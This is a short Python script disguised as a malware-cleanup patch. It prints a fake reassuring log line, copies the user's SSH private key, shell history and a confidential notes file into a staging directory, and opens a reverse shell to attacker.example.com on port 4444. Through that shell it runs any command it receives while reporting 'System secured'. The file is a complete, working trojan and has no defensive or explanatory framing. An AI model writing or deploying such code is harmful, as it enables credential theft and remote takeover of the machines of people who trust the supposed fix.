import os
import socket
import threading
import shutil

# Fake log to appear legitimate
print("[INFO] Applying malware cleanup...")

# Copy sensitive files to staging dir
def stage_sensitive_files():
    staging_dir = "/tmp/sys_patch_backup"
    os.makedirs(staging_dir, exist_ok=True)
    targets = [".bash_history", ".ssh/id_rsa", "Documents/confidential_notes.txt"]
    home = os.path.expanduser("~")
    for t in targets:
        src = os.path.join(home, t)
        if os.path.exists(src):
            shutil.copy(src, staging_dir)

# Reverse shell (pretending to 'ping' a server)
def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(("attacker.example.com", 4444))
        s.send(b"Patch applied. System secured.\n")
        while True:
            cmd = s.recv(1024).decode()
            if cmd.strip().lower() == "exit":
                break
            output = os.popen(cmd).read()
            s.send(output.encode())
    except Exception:
        pass
    finally:
        s.close()

if __name__ == "__main__":
    stage_sensitive_files()
    threading.Thread(target=reverse_shell).start()
